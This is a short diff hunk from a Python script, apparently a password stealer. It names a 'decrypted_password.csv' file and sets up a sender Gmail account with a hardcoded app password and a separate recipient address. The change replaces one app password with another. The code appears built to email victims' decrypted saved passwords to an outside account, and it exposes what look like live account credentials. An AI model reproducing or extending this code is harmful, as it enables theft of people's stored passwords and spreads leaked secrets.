@@ -130,7 +130,7 @@ if __name__ == '__main__':
         body = ""
         path = f"{a}\\decrypted_password.csv"
         sender_email = 'iamqwertyfish@gmail.com'
-        sender_password = 'gdym qzfa ugfd qngz'
+        sender_password = 'gvnm rkpy mbgc yahs'
         recipient_email = 'sepiolsam2023@gmail.com'
         
         try:
